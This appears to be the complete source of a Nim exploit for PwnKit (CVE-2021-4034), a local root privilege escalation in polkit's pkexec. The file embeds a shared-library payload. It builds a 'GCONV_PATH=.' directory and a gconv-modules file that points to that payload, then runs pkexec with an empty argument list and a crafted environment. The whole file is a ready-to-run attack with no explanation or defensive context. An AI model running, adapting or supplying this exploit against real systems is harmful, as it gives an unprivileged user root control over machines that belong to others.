import os
import posix

const payload = staticRead("payload.so")

proc main() =
    echo("Attempting PwnKit CVE-2021-4034")

    discard existsOrCreateDir("GCONV_PATH=.")
    writeFile("GCONV_PATH=./pwnkit", "")
    discard chmod("GCONV_PATH=./pwnkit", 0o777)
    discard existsOrCreateDir("pwnkit")
    writeFile("pwnkit/gconv-modules", "module UTF-8// INTERNAL payload 2\n")

    writeFile("pwnkit/payload.so", payload)

    discard execve("/usr/bin/pkexec",
        allocCStringArray([]), 
        allocCStringArray(["pwnkit", "PATH=GCONV_PATH=.", "LC_MESSAGES=en_US.UTF-8", "XAUTHORITY=../pwnkit"])) 

main()